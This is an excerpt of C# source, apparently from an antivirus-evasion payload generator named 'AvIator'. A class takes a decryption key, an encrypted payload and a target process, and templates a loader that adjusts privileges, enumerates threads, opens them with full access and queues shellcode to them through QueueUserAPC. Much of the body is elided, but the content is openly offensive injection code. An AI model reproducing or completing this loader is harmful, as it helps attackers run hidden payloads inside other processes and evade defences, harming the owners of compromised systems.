...
namespace AvIator
{
    class APCInjecionX64
    {
        String code;

        public APCInjecionX64(String decKey, String encPayload, String proc)
        {
            code = @"using System;
                        using System;
                        using System.Collections.Generic;
    ...
    public static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
                                    ...
                                    class Program
                                    {
                                        ...
                                        static void Main(string[] args)
                                        {
                                            ...
                                            IntPtr processHandle, snapshotHandle, ptrToMemoryAlloc;                
                                            ...
                                            if(!InjectShellcode.Thread32First(snapshotHandle, ref thr32))
                                            {
                                                ...
                                                while (InjectShellcode.Thread32Next(snapshotHandle, ref thr32))
                                                {
                                                    ...
                                                    {
                                                        IntPtr hthread = InjectShellcode.OpenThread(InjectShellcode.ThreadAccess.THREAD_ALL_ACCESS, false, thr32.th32ThreadID);
                                                        ...
                                                        if(InjectShellcode.QueueUserAPC(ptrToMemoryAlloc,hthread,IntPtr.Zero)==IntPtr.Zero)
                                                        {
                                                            InjectShellcode.CloseHandle(processHandle);
